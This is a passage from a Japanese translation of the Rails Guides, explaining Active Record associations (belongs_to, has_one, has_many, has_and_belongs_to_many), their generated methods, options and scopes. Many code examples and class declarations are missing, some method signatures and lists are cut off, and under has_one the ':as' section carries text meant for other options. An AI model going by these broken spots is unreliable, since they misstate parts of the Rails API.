  belongs_to :customer, inverse_of: :orders
上のように変更することで、Active Recordはcustomerオブジェクトのコピーを1つだけ読み込むようになり、不整合を防ぐと同時にアプリケーションの効率も高まります。
ただし、`inverse_of`のサポートにはいくつかの制限があります。
* `:through`関連付けと併用することはできません。
* `:polymorphic`関連付けと併用することはできません。
* `:as`関連付けと併用することはできません。
* `belongs_to`関連付けの場合、`has_many`の逆関連付けは無視されます。
関連付けでは、常に逆関連付けを自動的に検出しようとします。その際、関連付け名に基いて`:inverse_of`オプションがヒューリスティックに設定されます。
標準的な名前であれば、ほとんどの関連付けで逆関連付けがサポートされます。
ただし、以下のオプションを設定した関連付けでは、逆関連付けは自動的には設定されません。
* :conditions
* :through
* :polymorphic
* :foreign_key
関連付けの詳細情報
この節では、各関連付けの詳細を解説します。関連付けの宣言によって追加されるメソッドやオプションについても説明します。
### `belongs_to`関連付けの詳細
`belongs_to`関連付けは、別のモデルとの間に1対1の関連付けを作成します。
データベースの用語で説明すると、この関連付けが行われているクラスには外部キーがあるということです。
外部キーが自分のクラスではなく相手のクラスにあるのであれば、`belongs_to`ではなく`has_one`を使用する必要があります。
#### `belongs_to`で追加されるメソッド
`belongs_to`関連付けを宣言したクラスでは、以下の5つのメソッドを自動的に利用できるようになります。
* `association(force_reload = false)`
* `association=(associate)`
* `build_association(attributes = {})`
* `create_association(attributes = {})`
* `create_association!(
attributes = {})`
これらのメソッドのうち、`association`の部分はプレースホルダであり、`belongs_to`の最初の引数である関連付け名をシンボルにしたものに置き換えられます。
以下の例ではcustomerが宣言されています。
customer
customer=
build_customer
create_customer
create_customer!
NOTE: 新しく作成した`has_one`関連付けまたは`belongs_to`関連付けを初期化するには、`build_`で始まるメソッドを使用する必要があります。この場合`has_many`関連付けや`has_and_belongs_to_many`関連付けで使用される`association.build`メソッドは使用しないでください。
作成するには、`create_`で始まるメソッドを使用してください。
##### `association(force_reload = false)`
`association`メソッドは関連付けられたオブジェクトを返します。
関連付けられたオブジェクトがない場合は`nil`を返します。
@customer = @order.customer
関連付けられたオブジェクトがデータベースから検索されたことがある場合は、キャッシュされたものを返します。
キャッシュを読み出さずにデータベースから直接読み込ませたい場合は、`force_reload`の引数に`true`を設定します。
##### `association=(associate)`
`association=`メソッドは、引数のオブジェクトをそのオブジェクトに関連付けます。
その背後では、関連付けられたオブジェクトから主キーを取り出し、そのオブジェクトの外部キーにその同じ値を設定しています。
@order.customer = @customer
##### `build_association(attributes = {})`
`build_association`メソッドは、関連付けられた型の新しいオブジェクトを返します。
返されるオブジェクトは、渡された属性に基いてインスタンス化され、外部キーを経由するリンクが設定されます。関連付けられたオブジェクトは、値が返された時点ではまだ保存されて_いない_ことにご注意ください。
@customer = @order.build_customer(customer_number: 123,
                                  customer_name: "John Doe")
##### `create_association(attributes = {})`
`create_association`メソッドは、関連付けられた型の新しいオブジェクトを返します。
このオブジェクトは、渡された属性を使用してインスタンス化され、そのオブジェクトの外部キーを介してリンクが設定されます。そして、関連付けられたモデルで指定されている検証がすべてパスすると、この関連付けられたオブジェクトは保存されます。
@customer = @order.create_customer(customer_number: 123,
                                   customer_name: "John Doe")
##### `create_association!(
上の`create_association`と同じですが、レコードがinvalidの場合に`ActiveRecord::RecordInvalid`がraiseされる点が異なります。
#### `belongs_to`のオプション
Railsのデフォルトの`belongs_to`関連付けは、ほとんどの場合カスタマイズ不要ですが、時には関連付けの動作をカスタマイズしたくなることもあると思います。
これは、作成するときに渡すオプションとスコープブロックで簡単にカスタマイズできます。
たとえば、以下のようなオプションを関連付けに追加できます。
  belongs_to :customer, dependent: :destroy,
    counter_cache: true
`belongs_to`関連付けでは以下のオプションがサポートされています。
* `:autosave`
* `:class_name`
* `:counter_cache`
* `:dependent`
* `:foreign_key`
* `:inverse_of`
* `:polymorphic`
* `:touch`
* `:validate`
##### `:autosave`
`:autosave`オプションを`true`に設定すると、親オブジェクトが保存されるたびに、読み込まれているすべてのメンバを保存し、destroyフラグが立っているメンバを破棄します。
##### `:class_name`
関連名から関連相手のオブジェクト名を生成できない事情がある場合、`:class_name`オプションを使用してモデル名を直接指定できます。
たとえば、注文(order)が顧客(customer)に従属しているが、実際の顧客モデル名が`Patron`である場合には以下のように指定します。
  belongs_to :customer, class_name: "Patron"
##### `:counter_cache`
`:counter_cache`オプションは、従属しているオブジェクトの数の検索効率を向上させます。
以下のモデルで説明します。
上の宣言のままでは、`@customer.orders.size`の値を知るためにデータベースに対して`COUNT(*)`クエリを実行する必要があります。
この呼び出しを避けるために、「従属している方のモデル(`belongs_to`を宣言している方のモデル)」にカウンタキャッシュを追加することができます。
  belongs_to :customer, counter_cache: true
上のように宣言すると、キャッシュ値が最新の状態に保たれ、次に`size`メソッドが呼び出されたときにその値が返されます。
ここで1つ注意が必要です。`:counter_cache`オプションは`belongs_to`宣言で指定しますが、実際に数を数えたいカラムは、相手のモデル(関連付けられているモデル)の方に追加する必要があります。
上の場合には、`Customer`モデルの方に`orders_count`カラムを追加する必要があります。
必要であれば、デフォルトのカラム名を以下のようにオーバーライドできます。
  belongs_to :customer, counter_cache: :count_of_orders
カウンタキャッシュ用のカラムは、`attr_readonly`によって読み出し専用属性となるモデルのリストに追加されます。
##### `:dependent`
`:dependent`オプションの動作は以下のように対象によって異なります。
* `:destroy` -- そのオブジェクトがdestroyされると、関連付けられたオブジェクトに対して`destroy`が呼び出されます。
* `:delete` -- オブジェクトがdestroyされると、関連付けられたオブジェクトはすべて直接削除されます。このときオブジェクトの`destroy`メソッドは呼び出されません。
WARNING: 他のクラスの`has_many` 関連付けとつながりのある `belongs_to` 関連付けに対してこのオプションを使用してはいけません。
孤立したレコードがデータベースに残ってしまう可能性があります。
##### `:foreign_key`
Railsの慣例では、相手のモデルを指す外部キーを保持している結合テーブル上のカラム名については、そのモデル名にサフィックス `_id` を追加した関連付け名が使用されることを前提とします。
`:foreign_key`オプションを使用すると外部キーの名前を直接指定することができます。
  belongs_to :customer, class_name: "Patron",
                        foreign_key: "patron_id"
TIP: Railsは外部キーのカラムを自動的に作ることはありません。
外部キーを使用する場合には、マイグレーションで明示的に定義する必要があります。
##### `:inverse_of`
`:inverse_of`オプションは、その関連付けの逆関連付けとなる`has_many`関連付けまたは`has_one`関連付けの名前を指定します。
`:polymorphic`オプションと組み合わせた場合は無効です。
##### `:polymorphic`
`:polymorphic`オプションに`true`を指定すると、ポリモーフィック関連付けを指定できます。
ポリモーフィック関連付けの詳細については[このガイドの説明](#ポリモーフィック関連付け)を参照してください。
##### `:touch`
`:touch`オプションを`:true`に設定すると、関連付けられているオブジェクトが保存またはdestroyされるたびに、そのオブジェクトの`updated_at`または`updated_on`タイムスタンプが現在時刻に設定されます。
  belongs_to :customer, touch: true
上の例の場合、Orderクラスは、関連付けられているCustomerのタイムスタンプを保存時またはdestroy時に更新します。
更新時に特定のタイムスタンプ属性を指定することもできます。
  belongs_to :customer, touch: :orders_updated_at
##### `:validate`
`:validate`オプションを`true`に設定すると、関連付けられたオブジェクトが保存時に必ず検証(validation)されます。
デフォルトは`false`であり、この場合関連付けられたオブジェクトは保存時に検証されません。
#### `belongs_to`のスコープ
場合によっては`belongs_to`で使用されるクエリをカスタマイズしたくなることがあります。
スコープブロックを使用してこのようなカスタマイズを行うことができます。
  belongs_to :customer, -> { where active: true },
                        dependent: :destroy 
スコープブロック内では標準の[クエリメソッド](active_record_querying.html)をすべて使用できます。
ここでは以下について説明します。
##### `where`
`where`は、関連付けられるオブジェクトが満たすべき条件を指定します。
  belongs_to :customer, -> { where active: true }
##### `includes`
`includes`メソッドを使用すると、その関連付けが使用されるときにeager-load (訳注:preloadとは異なる)しておきたい第2関連付けを指定することができます。
以下のモデルを例にとって考えてみましょう。
  has_many :line_items
LineItemから顧客名(Customer)を`@line_item.order.customer`のように直接取り出す機会が頻繁にあるのであれば、LineItemとOrderの関連付けを行なう時にCustomerをあらかじめincludeしておくことで無駄なクエリを減らし、効率を高めることができます。
  belongs_to :order, -> { includes :customer }
NOTE: 直接の関連付けでは`includes`を使用する必要はありません。`Order belongs_to :customer`のような直接の関連付けでは必要に応じて自動的にeager-loadされます。
##### `readonly`
`readonly`を指定すると、関連付けられたオブジェクトから取り出した内容は読み出し専用になります。
##### `select`
`select`メソッドを使用すると、関連付けられたオブジェクトのデータ取り出しに使用されるSQLの`SELECT`句を上書きします。
Railsはデフォルトではすべてのカラムを取り出します。
TIP: `select`を`belongs_to`関連付けで使用する場合、正しい結果を得るために`:foreign_key`オプションを必ず設定してください。
#### 関連付けられたオブジェクトが存在するかどうかを確認する
`association.nil?`メソッドを使用して、関連付けられたオブジェクトが存在するかどうかを確認できます。
if @order.customer.nil?
  @msg = "No customer found for this order"
#### オブジェクトが保存されるタイミング
オブジェクトを`belongs_to`関連付けに割り当てても、そのオブジェクトが自動的に保存されるわけでは_ありません_。
関連付けられたオブジェクトが保存されることもありません。
### `has_one`関連付けの詳細
`has_one`関連付けは他のモデルと1対1対応します。
データベースの観点では、この関連付けでは相手のクラスが外部キーを持ちます。
相手ではなく自分のクラスが外部キーを持っているのであれば、`belongs_to`を使うべきです。
#### `has_one`で追加されるメソッド
`has_one`関連付けを宣言したクラスでは、以下の5つのメソッドを自動的に利用できるようになります。
これらのメソッドのうち、`association`の部分はプレースホルダであり、`has_one`の最初の引数である関連付け名をシンボルにしたものに置き換えられます。
たとえば以下の宣言を見てみましょう。
これにより、`Supplier`モデルのインスタンスで以下のメソッドが使えるようになります。
account
account=
build_account
create_account
create_account!
@account = @supplier.account
その背後では、そのオブジェクトから主キーを取り出し、関連付けるオブジェクトの外部キーの値をその主キーと同じ値にします。
@supplier.account = @account
このオブジェクトは、渡された属性でインスタンス化され、そのオブジェクトの外部キーを介してリンクが設定されます。ただし、関連付けられたオブジェクトはまだ保存されません。
@account = @supplier.build_account(terms: "Net 30")
このオブジェクトは、渡された属性を使用してインスタンス化され、そのオブジェクトの外部キーを介してリンクが設定されます。そして、関連付けられたモデルで指定されている検証がすべてパスすると、この関連付けられたオブジェクトは保存されます。
@account = @supplier.create_account(terms: "Net 30")
#### `has_one`のオプション
Railsのデフォルトの`has_one`関連付けは、ほとんどの場合カスタマイズ不要ですが、時には関連付けの動作をカスタマイズしたくなることもあると思います。
これは、作成するときにオプションを渡すことで簡単にカスタマイズできます。
  has_one :account, class_name: "Billing", dependent: :nullify
`has_one`関連付けでは以下のオプションがサポートされます。
* `:as`
* `:primary_key`
* `:source`
* `:source_type`
* `:through`
##### `:as`
`:as`オプションに`true`を設定すると、ポリモーフィック関連付けを指定できます。
たとえば、Supplierにアカウントが1つあり、アカウントを含むモデルの実際の名前が`Account`ではなく`Billing`になっている場合、以下のようにモデル名を指定できます。
  has_one :account, class_name: "Billing"
オーナーオブジェクトがdestroyされた時に、それに関連付けられたオブジェクトをどうするかを制御します。
* `:destroy`を指定すると、関連付けられたオブジェクトも同時にdestroyされます。
* `:delete`を指定すると、関連付けられたオブジェクトはデータベースから直接削除されます。このときコールバックは実行されません。
* `:nullify`を指定すると、外部キーが`NULL`に設定されます。
このときコールバックは実行されません。
* `:restrict_with_exception`を指定すると、関連付けられたレコードがある場合に例外が発生します。
* `:restrict_with_error`を指定すると、関連付けられたオブジェクトがある場合にエラーがオーナーに追加されます。
`NOT NULL`データベース制約のある関連付けでは、`:nullify`オプションを与えないようにする必要があります。
そのような関連付けをdestroyする`dependent`を設定しなかった場合、関連付けられたオブジェクトを変更できなくなってしまいます。これは、最初に関連付けられたオブジェクトの外部キーが`NULL`値になってしまい、この値は許されていないためです。
Railsの慣例では、相手のモデル上の外部キーを保持しているカラム名については、そのモデル名にサフィックス `_id` を追加した関連付け名が使用されることを前提とします。
  has_one :account, foreign_key: "supp_id"
`:inverse_of`オプションは、その関連付けの逆関連付けとなる`belongs_to`関連付けの名前を指定します。
`:through`または`:as`オプションと組み合わせた場合は無効です。
  has_one :account, inverse_of: :supplier
  belongs_to :supplier, inverse_of: :account
##### `:primary_key`
Railsの慣例では、モデルの主キーは`id`カラムに保存されていることを前提とします。
`:primary_key`オプションで主キーを明示的に指定することでこれを上書きすることができます。
##### `:source`
`:source`オプションは、`has_one :through`関連付けにおける「ソースの」関連付け名、つまり関連付け元の名前を指定します。
##### `:source_type`
`:source_type`オプションは、ポリモーフィック関連付けを介して行われる`has_one :through`関連付けにおける「ソースの」関連付けタイプ、つまり関連付け元のタイプを指定します。
##### `:through`
`:through`オプションは、クエリ実行時に経由する結合(join)モデルを指定します。
#### `has_one`のスコープについて
場合によっては`has_one`で使用されるクエリをカスタマイズしたくなることがあります。
  has_one :account, -> { where active: true }
  has_one :account, -> { where "confirmed = 1" }
  belongs_to :representative
class Representative < ActiveRecord::Base
  has_many :accounts
上の例で、Supplierから代表(Representative)を`@supplier.account.representative`のように直接取り出す機会が頻繁にあるのであれば、SupplierからAccountへの関連付けにRepresentativeをあらかじめincludeしておくことで無駄なクエリを減らし、効率を高めることができます。
  has_one :account, -> { includes :representative }
`readonly`を指定すると、関連付けられたオブジェクトを取り出すときに読み出し専用になります。
if @supplier.account.nil?
  @msg = "No account found for this supplier"
`has_one`関連付けにオブジェクトをアサインすると、外部キーを更新するためにそのオブジェクトは自動的に保存されます。
さらに、置き換えられるオブジェクトは、これは外部キーが変更されたことによってすべて自動的に保存されます。
関連付けられているオブジェクト同士のいずれか一方が検証(validation)エラーで保存に失敗すると、アサインの式からは`false`が返され、アサインはキャンセルされます。
親オブジェクト(`has_one`関連付けを宣言している側のオブジェクト)が保存されない場合(つまり`new_record?`が`true`を返す場合)、子オブジェクトは追加時に保存されません。
親オブジェクトが保存された場合は、子オブジェクトは保存されます。
`has_one`関連付けにオブジェクトをアサインし、しかもそのオブジェクトを保存したくない場合、`association.build`メソッドを使用してください。
### `has_many`関連付けの詳細
`has_many`関連付けは、他のモデルとの間に「1対多」のつながりを作成します。
データベースの観点では、この関連付けにおいては相手のクラスが外部キーを持ちます。この外部キーは相手のクラスのインスタンスを参照します。
#### `has_many`で追加されるメソッド
`has_many`関連付けを宣言したクラスでは、以下の16のメソッドを自動的に利用できるようになります。
* `collection(force_reload = false)`
* `collection<<(object, ...)
* `collection.delete(object, ...)
* `collection.destroy(object, ...)
* `collection_singular_ids`
* `collection.clear`
* `collection.empty?
* `collection.size`
* `collection.find(...)
* `collection.where(...)
* `collection.exists?(...)
* `collection.build(attributes = {}, ...)
* `collection.create(attributes = {})`
* `collection.create!(
上のメソッドの`collection`の部分はプレースホルダであり、実際には`has_many`への1番目の引数として渡されたシンボルに置き換えられます。また、`collection_singular`の部分はシンボルの単数形に置き換えられます。
orders(force_reload = false)
orders<<(object, ...)
orders.delete(object, ...)
orders.destroy(object, ...)
order_ids
orders.clear
orders.empty?
orders.size
orders.find(...)
orders.where(...)
orders.exists?(...)
orders.build(attributes = {}, ...)
orders.create(attributes = {})
attributes = {})`
##### `collection(force_reload = false)`
`collection`メソッドは、関連付けられたすべてのオブジェクトの配列を返します。
関連付けられたオブジェクトがない場合は、空の配列を1つ返します。
@orders = @customer.orders
##### `collection<<(object, ...)
`collection<<`メソッドは、1つ以上のオブジェクトをコレクションに追加します。このとき、追加されるオブジェクトの外部キーは、呼び出し側モデルの主キーに設定されます。
@customer.orders << @order1
##### `collection.delete(object, ...)
`collection.delete`メソッドは、外部キーを`NULL`に設定することで、コレクションから1つまたは複数のオブジェクトを削除します。
@customer.orders.delete(@order1)
WARNING: 削除のされ方はこれだけではありません。オブジェクト同士が`dependent: :destroy`で関連付けられている場合はdestroyされますが、オブジェクト同士が`dependent: :delete_all`で関連付けられている場合はdeleteされますのでご注意ください。
##### `collection.destroy(object, ...)
`collection.destroy`は、コレクションに関連付けられているオブジェクトに対して`destroy`を実行することで、コレクションから1つまたは複数のオブジェクトを削除します。
@customer.orders.destroy(@order1)
WARNING: この場合オブジェクトは_無条件で_データベースから削除されます。このとき、`:dependent`オプションがどのように設定されていても無視して削除が行われます。
`collection=`メソッドは、指定したオブジェクトでそのコレクションの内容を置き換えます。元からあったオブジェクトは削除されます。
##### `collection_singular_ids`
`collection_singular_ids`メソッドは、そのコレクションに含まれるオブジェクトのidを配列にしたものを返します。
@order_ids = @customer.order_ids
`collection_singular_ids=`メソッドは、指定された主キーidを持つオブジェクトの集まりでコレクションの内容を置き換えます。元からあったオブジェクトは削除されます。
##### `collection.clear`
`collection.clear`メソッドは、コレクションからすべてのオブジェクトを削除します。
`dependent: :destroy`で関連付けられたオブジェクトがある場合は、それらのオブジェクトはdestroyされます。`dependent: :delete_all`で関連付けられたオブジェクトがある場合は、データベースから直接deleteされます。それ以外の場合は単に外部キーが`NULL`に設定されます。
##### `collection.empty?
`collection.empty?`メソッドは、関連付けられたオブジェクトがコレクションに含まれていない場合に`true`を返します。
<% if @customer.orders.empty? 
  注文はありません。
##### `collection.size`
`collection.size`メソッドは、コレクションに含まれるオブジェクトの数を返します。
@order_count = @customer.orders.size
##### `collection.find(...)
`collection.find`メソッドは、コレクションに含まれるオブジェクトを検索します。
このメソッドで使用される文法は、`ActiveRecord::Base.find`で使用されているものと同じです。
@open_orders = @customer.orders.find(1)
##### `collection.where(...)
`collection.where`メソッドは、コレクションに含まれているメソッドを指定された条件に基いて検索します。このメソッドではオブジェクトは遅延読み込み(lazy load)される点にご注意ください。つまり、オブジェクトに実際にアクセスが行われる時にだけデータベースへのクエリが発生します。
@open_orders = @customer.orders.where(open: true) # この時点ではクエリは行われない
@open_order = @open_orders.first # ここで初めてデータベースへのクエリが行われる
##### `collection.exists?(...)
`collection.exists?`メソッドは、指定された条件に合うオブジェクトがコレクションの中に存在するかどうかをチェックします。
##### `collection.build(attributes = {}, ...)
`collection.build`メソッドは、関連付けが行われたオブジェクトを1つまたは複数返します。
返されるオブジェクトは、渡された属性に基いてインスタンス化され、外部キーを経由するリンクが作成されます。関連付けられたオブジェクトは、値が返された時点ではまだ保存されて_いない_ことにご注意ください。
@order = @customer.orders.build(order_date: Time.now,
                                order_number: "A12345")
##### `collection.create(attributes = {})`
`collection.create`メソッドは、関連付けが行われたオブジェクトを1つ返します。
このオブジェクトは、渡された属性を使用してインスタンス化され、そのオブジェクトの外部キーを介してリンクが作成されます。そして、関連付けられたモデルで指定されている検証がすべてパスすると、この関連付けられたオブジェクトは保存されます。
@order = @customer.orders.create(order_date: Time.now,
                                 order_number: "A12345")
##### `collection.create!(
上の`collection.create`と同じですが、レコードがinvalidの場合に`ActiveRecord::RecordInvalid`がraiseされる点が異なります。
#### `has_many`のオプション
Railsのデフォルトの`has_many`関連付けは、ほとんどの場合カスタマイズ不要ですが、時には関連付けの動作をカスタマイズしたくなることもあると思います。
  has_many :orders, dependent: :delete_all, validate: :false
`has_many`関連付けでは以下のオプションがサポートされます。
たとえば、1人の顧客(customer)が複数の注文(order)を持っているが、実際の注文モデル名が`Transaction`である場合には以下のように指定します。
  has_many :orders, class_name: "Transaction"
オーナーオブジェクトがdestroyされたときに、オーナーに関連付けられたオブジェクトをどうするかを制御します。
* `:destroy`を指定すると、関連付けられたオブジェクトもすべて同時にdestroyされます。
* `:delete`を指定すると、関連付けられたオブジェクトはすべてデータベースから直接削除されます。このときコールバックは実行されません。
* `:nullify`を指定すると、外部キーはすべて`NULL`に設定されます。
* `:restrict_with_exception`を指定すると、関連付けられたレコードが1つでもある場合に例外が発生します。
* `:restrict_with_error`を指定すると、関連付けられたオブジェクトが1つでもある場合にエラーがオーナーに追加されます。
  has_many :orders, foreign_key: "cust_id"
Railsの慣例では、関連付けの主キーは`id`カラムに保存されていることを前提とします。
`users`テーブルに主キーとして`id`カラムがあり、その他に`guid`カラムもあるとします。
さらに、`todos`テーブルでは`users`テーブルの`id`カラムの値ではなく`guid`カラムの値を保持したいとします。
これは以下のようにすることで実現できます。
  has_many :todos, primary_key: :guid
ここで`@user.todos.create`を実行すると、`@todo`レコードの`user_id`カラムの値には`@user`の`guid`値が設定されます。
`:source`オプションは、`has_many :through`関連付けにおける「ソースの」関連付け名、つまり関連付け元の名前を指定します。
このオプションは、関連付け名から関連付け元の名前が自動的に推論できない場合以外には使用する必要はありません。
`:source_type`オプションは、ポリモーフィック関連付けを介して行われる`has_many :through`関連付けにおける「ソースの」関連付けタイプ、つまり関連付け元のタイプを指定します。
`:validate`オプションを`false`に設定すると、関連付けられたオブジェクトは保存時に検証(validation)されません。
デフォルトは`true`であり、この場合関連付けられたオブジェクトは保存時に検証されます。
#### `has_many`のスコープについて
場合によっては`has_many`で使用されるクエリをカスタマイズしたくなることがあります。
  has_many :orders, -> { where processed: true }
  has_many :confirmed_orders, -> { where "confirmed = 1" },
    class_name: "Order"
条件はハッシュを使用して指定することもできます。
  has_many :confirmed_orders, -> { where confirmed: true },
                              class_name: "Order"
`where`オプションでハッシュを使用した場合、この関連付けで作成されたレコードは自動的にこのハッシュを使用したスコープに含まれるようになります。
この例の場合、`@customer.confirmed_orders.create`または`@customer.confirmed_orders.build`を実行すると、confirmedカラムの値が`true`の注文(order)が常に作成されます。
##### `extending`
`extending`メソッドは、関連付けプロキシを拡張する名前付きモジュールを指定します。
##### `group`
`group`メソッドは、結果をグループ化する際の属性名を1つ指定します。内部的にはSQLの`GROUP BY`句が使用されます。
  has_many :line_items, -> { group 'orders.id' },
                        through: :orders
顧客名(Customer)からLineItemを`@customer.orders.line_items`のように直接取り出す機会が頻繁にあるのであれば、CustomerとOrderの関連付けを行なう時にLineItemをあらかじめincludeしておくことで無駄なクエリを減らし、効率を高めることができます。
  has_many :orders, -> { includes :line_items }
##### `limit`
`limit`メソッドは、関連付けを使用して取得できるオブジェクトの総数を制限するのに使用します。
  has_many :recent_orders,
    -> { order('order_date desc').limit(100) },
    class_name: "Order",
##### `offset`
`offset`メソッドは、関連付けを使用してオブジェクトを取得する際の開始オフセットを指定します。
たとえば、`-> { offset(11) }`と指定すると、最初の11レコードはスキップされ、12レコード目から返されるようになります。
##### `order`
`order`メソッドは、関連付けられたオブジェクトに与えられる順序を指定します。内部的にはSQLの`ORDER BY`句が使用されます。
  has_many :orders, -> { order "date_confirmed DESC" }
`readonly`を指定すると、関連付けられたオブジェクトを取り出すときに読み出し専用になります。
`select`メソッドを使用すると、関連付けられたオブジェクトのデータ取り出しに使用されるSQLの`SELECT`句を上書きします。
WARNING: 独自の`select`メソッドを使用する場合には、関連付けられているモデルの主キーカラムと外部キーカラムを必ず含めておいてください。
これを行わなかった場合、Railsでエラーが発生します。
##### `distinct`
`distinct`メソッドは、コレクション内で重複が発生しないようにします。
このメソッドは`:through`オプションと併用するときに特に便利です。
  has_many :readings
person = Person.create(name: 'John')
今度は`distinct`を設定してみましょう。
person = Person.create(name: 'Honda')
上の例でもreadingは2つあって重複しています。
挿入時にも同様に、現在残っているすべてのレコードが一意であるようにする(関連付けを検査したときに重複レコードが決して発生しないようにする)には、テーブル自体に一意のインデックスを追加する必要があります。
なお、`include?`などを使用して一意性をチェックすると競合が発生しやすいので注意が必要です。
関連付けで強制的に一意になるようにするために`include?`を使用しないでください。
`has_many`関連付けにオブジェクトをアサインすると、外部キーを更新するためにそのオブジェクトは自動的に保存されます。
1つの文で複数のオブジェクトをアサインすると、それらはすべて保存されます。
関連付けられているオブジェクトの1つでも検証(validation)エラーで保存に失敗すると、アサインの式からは`false`が返され、アサインはキャンセルされます。
親オブジェクト(`has_many`関連付けを宣言している側のオブジェクト)が保存されない場合(つまり`new_record?`が`true`を返す場合)、子オブジェクトは追加時に保存されません。
親オブジェクトが保存されると、関連付けられていたオブジェクトのうち保存されていなかったメンバはすべて保存されます。
`has_many`関連付けにオブジェクトをアサインし、しかもそのオブジェクトを保存したくない場合、`collection.build`メソッドを使用してください。
### `has_and_belongs_to_many`関連付けの詳細
`has_and_belongs_to_many`関連付けは、他のモデルとの間に「多対多」のつながりを作成します。
データベースの観点では、2つのクラスは中間で結合テーブルを介して関連付けられます。この結合テーブルには、両方のクラスを指す外部キーがそれぞれ含まれます。
#### `has_and_belongs_to_many`で追加されるメソッド
`has_and_belongs_to_many`関連付けを宣言したクラスでは、以下の16のメソッドを自動的に利用できるようになります。
* `collection.build(attributes = {})`
上のメソッドの`collection`の部分はプレースホルダであり、実際には`has_and_belongs_to_many`への1番目の引数として渡されたシンボルに置き換えられます。また、`collection_singular`の部分はシンボルの単数形に置き換えられます。
assemblies(force_reload = false)
assemblies<<(object, ...)
assemblies.delete(object, ...)
assemblies.destroy(object, ...)
assembly_ids
assemblies.clear
assemblies.empty?
assemblies.size
assemblies.find(...)
assemblies.where(...)
assemblies.exists?(...)
assemblies.build(attributes = {}, ...)
assemblies.create(attributes = {})
assemblies.create!(attributes = {})`
##### 追加のカラムメソッド
`has_and_belongs_to_many`関連付けで使用している中間の結合テーブルが、2つの外部キー以外に何かカラムを含んでいる場合、これらのカラムは関連付けを介して取り出されるレコードに属性として追加されます。
属性が追加されたレコードは常に読み出し専用になります。このようにして読み出された属性に対する変更は保存できないためです。
WARNING: `has_and_belongs_to_many`関連付けで使用する結合テーブルにこのような余分なカラムを追加することはお勧めできません。
2つのモデルを多対多で結合する結合テーブルでこのような複雑な振る舞いが必要になるのであれば、`has_and_belongs_to_many`ではなく`has_many :through`を使用してください。
@assemblies = @part.assemblies
`collection<<`メソッドは、結合テーブル上でレコードを作成し、それによって1つまたは複数のオブジェクトをコレクションに追加します。
@part.assemblies << @assembly1
NOTE: このメソッドは`collection.concat`および`collection.push`のエイリアスです。
`collection.delete`メソッドは、結合テーブル上のレコードを削除し、それによって1つまたは複数のオブジェクトをコレクションから削除します。
このメソッドを実行してもオブジェクトはdestroyされません。
@part.assemblies.delete(@assembly1)
WARNING: このメソッドを呼び出しても、結合レコードでコールバックはトリガされません。
`collection.destroy`は、結合テーブル上のレコードに対して`destroy`を実行する(このときコールバックも実行します)ことで、コレクションから1つまたは複数のオブジェクトを削除します。
@part.assemblies.destroy(@assembly1)
@assembly_ids = @part.assembly_ids
`collection.clear`メソッドは、結合テーブル上のレコードを削除し、それによってすべてのオブジェクトをコレクションから削除します。
このメソッドを実行しても、関連付けられたオブジェクトはdestroyされません。
<% if @part.assemblies.empty? 
  ※この部分はどのアセンブリでも使用されません。
@assembly_count = @part.assemblies.size
このメソッドで使用される文法は、`ActiveRecord::Base.find`で使用されているものと同じです。
このメソッドでは、オブジェクトがコレクション内で従う必要のある追加条件も加味されます。
@assembly = @part.assemblies.find(1)
`collection.where`メソッドは、コレクションに含まれているメソッドを指定された条件に基いて検索します。このメソッドではオブジェクトは遅延読み込み(lazy load)される点にご注意ください。つまり、オブジェクトに実際にアクセスが行われる時にだけデータベースへのクエリが発生します。
@new_assemblies = @part.assemblies.where("created_at > ?", 2.days.ago)
`collection.exists?`メソッドは、指定された条件に合うオブジェクトがコレクションの中に存在するかどうかをチェックします。
##### `collection.build(attributes = {})`
`collection.build`メソッドは、関連付けが行われたオブジェクトを1つ返します。
このオブジェクトは、渡された属性でインスタンス化され、その結合テーブルを介してリンクが作成されます。ただし、関連付けられたオブジェクトはこの時点では保存s慣れて_いない_ことにご注意ください。
@assembly = @part.assemblies.build({assembly_name: "Transmission housing"})
このオブジェクトは、渡された属性を使用してインスタンス化され、結合テーブルを介してリンクが作成されます。そして、関連付けられたモデルで指定されている検証がすべてパスすると、この関連付けられたオブジェクトは保存されます。
@assembly = @part.assemblies.create({assembly_name: "Transmission housing"})
上の`collection.create`と同じですが、レコードがinvalidの場合に`ActiveRecord::RecordInvalid`がraiseされる点が異なります。
#### `has_and_belongs_to_many`のオプション
Railsのデフォルトの`has_and_belongs_to_many`関連付けは、ほとんどの場合カスタマイズ不要ですが、時には関連付けの動作をカスタマイズしたくなることもあると思います。
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies,
`has_and_belongs_to_many`関連付けでは以下のオプションがサポートされます。
* `:association_foreign_key`
* `:join_table`
##### `:association_foreign_key`
Railsの慣例では、相手のモデルを指す外部キーを保持している結合テーブル上のカラム名については、そのモデル名にサフィックス `_id` を追加した名前が使用されることを前提とします。
`:association_foreign_key`オプションを使用すると外部キーの名前を直接指定することができます。
TIP: `:foreign_key`オプションおよび`:association_foreign_key`オプションは、多対多の自己結合を行いたいときに便利です。
  has_and_belongs_to_many :friends,
      class_name: "User",
      foreign_key: "this_user_id",
      association_foreign_key: "other_user_id"
たとえば、1つの部品(Part)が複数の組み立て(Assembly)で使用され、組み立てを含む実際のモデル名が`Gadget`である場合、次のように設定します。
  has_and_belongs_to_many :assemblies, class_name: "Gadget"
Railsの慣例では、そのモデルを指す外部キーを保持している結合テーブル上のカラム名については、そのモデル名にサフィックス `_id` を追加した名前が使用されることを前提とします。
##### `:join_table`
辞書順に基いて生成された結合テーブルのデフォルト名が気に入らない場合、`:join_table`オプションを使用してデフォルトのテーブル名を上書きできます。
#### `has_and_belongs_to_many`のスコープについて
場合によっては`has_and_belongs_to_many`で使用されるクエリをカスタマイズしたくなることがあります。
  has_and_belongs_to_many :assemblies, -> { where active: true }
    -> { where "factory = 'Seattle'" }
    -> { where factory: 'Seattle' }
`where`オプションでハッシュを使用した場合、この関連付けで作成されたレコードは自動的にこのハッシュを使用したスコープに含まれるようになります。
この例の場合、`@parts.assemblies.create`または`@parts.assemblies.build`を実行すると、`factory`カラムの値が`Seattle`の注文(order)が常に作成されます。
  has_and_belongs_to_many :assemblies, -> { group "factory" }
`includes`メソッドを使用すると、その関連付けが使用されるときにeager-load (訳注:preloadとは異なる)しておきたい第2関連付けを指定することができます。
    -
たとえばoffset(11)と指定すると、最初の11レコードはスキップされ、12レコード目から返されるようになります。
##### `uniq`
`uniq`メソッドは、コレクション内の重複を削除します。
`has_and_belongs_to_many`関連付けにオブジェクトをアサインすると、結合テーブルを更新するためにそのオブジェクトは自動的に保存されます。
